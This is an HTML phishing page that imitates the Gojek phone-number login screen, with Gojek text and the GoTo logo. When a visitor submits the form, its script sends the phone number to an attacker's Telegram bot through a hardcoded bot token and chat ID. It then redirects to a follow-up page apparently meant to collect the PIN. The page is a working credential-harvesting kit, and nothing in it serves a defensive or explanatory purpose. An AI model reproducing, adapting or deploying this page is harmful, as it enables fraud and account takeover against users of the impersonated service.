<html lang="id">
<head>
  <meta charset="utf-8" />
  <meta content="width=device-width, initial-scale=1" name="viewport" />
  <title>Masukkan nomor HP</title>
  <link
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
    rel="stylesheet"
  />
  <link
    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap"
    rel="stylesheet"
  />
  <style>
    /* Reset and base */
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      font-family: 'Inter', sans-serif;
      background-color: #ffffff;
      color: #1a1a1a;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      padding: 1.25rem 1.25rem 0 1.25rem; /* px-5 pt-5 */
    }
    /* Header */
    header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 1.5rem; /* mb-6 */
    }
    header button {
      font-size: 1.5rem; /* text-2xl */
      color: #1a1a1a;
      background: none;
      border: none;
      cursor: pointer;
    }
    header .language-selector {
      display: flex;
      align-items: center;
      gap: 0.5rem; /* space-x-2 */
      border: 1px solid #d1d5db; /* border-gray-300 */
      border-radius: 9999px; /* rounded-full */
      padding: 0.375rem 0.75rem; /* py-1.5 px-3 */
      font-size: 0.875rem; /* text-sm */
      color: #4b5563; /* text-gray-700 */
      user-select: none;
    }
    /* Main container */
    main {
      flex-grow: 1;
      max-width: 28rem; /* max-w-md */
      width: 100%;
      margin-left: auto;
      margin-right: auto;
      display: flex;
      flex-direction: column;
    }
    /* Title */
    h1 {
      font-weight: 800; /* font-extrabold */
      font-size: 1.5rem; /* text-2xl */
      margin-bottom: 0.5rem; /* mb-2 */
    }
    /* Paragraph */
    p.description {
      color: #4b5563; /* text-gray-700 */
      font-size: 0.875rem; /* text-sm */
      margin-bottom: 1.5rem; /* mb-6 */
      line-height: 1.5;
    }
    /* Label */
    label {
      display: block;
      font-weight: 600; /* font-semibold */
      color: #1a1a1a;
      margin-bottom: 0.25rem; /* mb-1 */
      font-size: 0.875rem;
    }
    label span.required {
      color: #dc2626; /* text-red-600 */
    }
    /* Form */
    form {
      margin-bottom: 1.5rem; /* mb-6 */
    }
    .input-group {
      display: flex;
      align-items: center;
      gap: 0.75rem; /* space-x-3 */
      margin-bottom: 0.25rem; /* mb-1 */
    }
    .country-code-btn {
      display: flex;
      align-items: center;
      gap: 0.25rem; /* space-x-1 */
      border: 1px solid #d1d5db; /* border-gray-300 */
      border-radius: 9999px; /* rounded-full */
      padding: 0.375rem 0.75rem; /* py-1.5 px-3 */
      font-size: 0.875rem; /* text-sm */
      color: #1a1a1a;
      background: none;
      cursor: default;
      user-select: none;
    }
    .country-code-btn img {
      border-radius: 0.125rem; /* rounded-sm */
      width: 20px;
      height: 15px;
      object-fit: cover;
    }
    input[type="tel"] {
      flex-grow: 1;
      border: none;
      border-bottom: 1px solid #000000;
      font-weight: 800; /* font-extrabold */
      font-size: 1.5rem; /* text-2xl */
      color: #1a1a1a;
      background: transparent;
      padding: 0.125rem 0;
      outline-offset: 2px;
    }
    input[type="tel"]::placeholder {
      color: #9ca3af; /* placeholder-gray-400 */
      font-weight: 800;
    }
    input[type="tel"]:focus {
      outline: none;
      border-bottom-color: #000000;
    }
    /* Submit button */
    button#submitBtn {
      width: 100%;
      border-radius: 9999px; /* rounded-full */
      padding: 0.75rem 0; /* py-3 */
      font-weight: 600; /* font-semibold */
      font-size: 1rem;
      border: none;
      transition: background-color 0.3s ease, color 0.3s ease;
    }
    button#submitBtn:disabled {
      background-color: #D3D3D3; /* bg-gray-200 */
      color: #FFFFFF; /* text-gray-600 */
      cursor: not-allowed;
    }
    button#submitBtn:not(:disabled) {
      background-color: #008000; /* bg-gray-100 */
      color: #FFFFFF; /* text-gray-700 */
      cursor: pointer;
    }
    /* Small text */
    p.agreement {
      font-size: 0.75rem; /* text-xs */
      color: #FFFFFF; /* text-gray-700 */
      margin-bottom: 1.5rem; /* mb-6 */
    }
    p.agreement a {
      color: #059669; /* text-green-600 */
      text-decoration: underline;
    }
    /* Secondary button */
    button.secondary-btn {
      border: 1px solid #374151; /* border-gray-700 */
      border-radius: 9999px; /* rounded-full */
      padding: 0.375rem 1rem; /* py-1.5 px-4 */
      font-size: 0.875rem; /* text-sm */
      font-weight: 600; /* font-semibold */
      color: #1a1a1a;
      background: none;
      cursor: pointer;
      margin-bottom: 2.5rem; /* mb-10 */
    }
    /* Footer */
    .footer {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 0.5rem; /* space-x-2 */
      font-size: 0.75rem; /* text-xs */
      color: #4b5563; /* text-gray-700 */
    }
    .footer img {
      width: 60px;
      height: 20px;
      object-fit: contain;
    }
    /* Responsive */
    @media (max-width: 40px) {
      main {
        max-width: 100%;
      }
    }
  </style>
</head>
<body>
  <header>
    <button aria-label="Back">
      <i class="fas fa-arrow-left"></i>
    </button>
    <div class="language-selector">
      <i class="fas fa-language"></i>
      <span>Bahasa Indonesia</span>
    </div>
  </header>
  <main>
    <h1>Masukkan nomor HP</h1>
    <p class="description">
      Nomor HP kamu akan dipakai untuk proses verifikasi dan masuk ke akun
      Gojek
    </p>
    <label for="phone"
      >Nomor HP <span class="required">*</span></label
    >
    <form id="phoneForm">
      <div class="input-group">
        <button class="country-code-btn" type="button" tabindex="-1" aria-hidden="true">
          <img
            alt="Bendera Indonesia"
            src="https://flagcdn.com/w20/id.png"
            width="20"
            height="15"
          />
          <span>+62</span>
        </button>
        <input
          aria-label="Nomor HP"
          id="phone"
          name="phone"
          pattern="[0-9x-]+"
          placeholder="81x-xxx-xxx"
          type="tel"
          required
        />
      </div>
      <button id="submitBtn" type="submit" disabled>Lanjut</button>
    </form>
    <p class="agreement">
      Saya menyetujui
      <a href="#">Ketentuan Layanan</a> &amp;
      <a href="#">Kebijakan Privasi</a> Gojek.
    </p>
    <button class="secondary-btn" type="button">
      Ada kendala atau lupa nomor?
    </button>
    <div class="footer">
      <span>from</span>
      <img
        alt="Logo goto berwarna hijau"
        src="https://upload.wikimedia.org/wikipedia/commons/8/88/GoTo_logo.svg"
        width="60"
        height="20"
      />
    </div>
  </main>

  <script>
    const phoneInput = document.getElementById("phone");
    const submitBtn = document.getElementById("submitBtn");
    const form = document.getElementById("phoneForm");

    phoneInput.addEventListener("input", () => {
      if (phoneInput.value.trim().length > 0) {
        submitBtn.disabled = false;
      } else {
        submitBtn.disabled = true;
      }
    });

    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      const phoneNumber = phoneInput.value.trim();

      // Ganti dengan token bot Telegram kamu
      const BOT_TOKEN = "8479141074:AAHXRTIUGTqpC0Qvw31YqB3pb3W6Ji6PfPc";
      // Ganti dengan chat ID kamu
      const CHAT_ID = "7549590022";

      const message = `GO-JEK Nomor HP: +62${phoneNumber}`;

      try {
        const res = await fetch(
          `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
          {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              text: message,
            }),
          }
        );

        const data = await res.json();

        if (data.ok) {
          location.href = "pingojek.html";
          phoneInput.value = "";
          submitBtn.disabled = true;
        } else {
          alert("Gagal mengirim data ke Telegram.");
        }
      } catch (error) {
        alert("Terjadi kesalahan saat mengirim data.");
        console.error(error);
      }
    });
  </script>
</body>
                                     </html>
